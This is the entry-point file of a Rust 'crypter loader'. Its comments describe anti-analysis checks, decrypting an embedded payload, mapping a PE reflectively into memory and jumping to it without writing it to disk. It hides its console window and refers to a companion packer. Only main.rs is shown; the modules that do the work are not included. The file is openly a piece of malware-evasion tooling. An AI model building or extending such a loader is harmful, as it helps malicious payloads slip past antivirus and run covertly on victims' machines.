//! Crypter loader: anti-analysis → decrypt embedded payload → reflective
//! PE map into this process → jump to its entry point. The payload is never
//! written to disk in plaintext.
#![cfg_attr(windows, windows_subsystem = "windows")]

#[cfg(windows)]
mod gen;
#[cfg(windows)]
mod win;

fn main() {
    #[cfg(windows)]
    win::run();

    #[cfg(not(windows))]
    {
        eprintln!(
            "crypter-loader: Windows-only. Build with \
             --target x86_64-pc-windows-gnu after running crypter-packer."
        );
    }
}
